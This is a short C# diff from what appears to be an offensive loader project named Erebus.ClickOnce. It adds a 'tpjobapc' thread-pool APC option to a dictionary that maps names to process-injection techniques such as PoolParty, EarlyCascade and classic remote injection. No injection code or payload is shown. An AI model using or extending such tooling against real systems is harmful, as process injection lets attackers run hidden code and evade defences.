@@ -8,12 +8,13 @@ namespace Erebus.ClickOnce
     {
         private static readonly Dictionary<string, Func<IInjectionMethod>> _injectionMethods = new()
         {
-            { "createfiber", () => new CreateFiberInjection() },
-            { "earlycascade", () => new EarlyCascadeInjection() },
-            { "poolparty", () => new PoolPartyInjection() },
-            { "classic", () => new ClassicRemoteInjection() },
-            { "enumdesktops", () => new EnumDesktopsInjection() },
-            { "appdomain", () => new AppDomainInjection() }
+            { "createfiber",    () => new CreateFiberInjection() },
+            { "earlycascade",   () => new EarlyCascadeInjection() },
+            { "poolparty",      () => new PoolPartyInjection() },
+            { "tpjobapc",       () => new TpJobObjectApcInjection() },
+            { "classic",        () => new ClassicRemoteInjection() },
+            { "enumdesktops",   () => new EnumDesktopsInjection() },
+            { "appdomain",      () => new AppDomainInjection() }
         };
 
         public static IInjectionMethod GetInjectionMethod(string methodName)
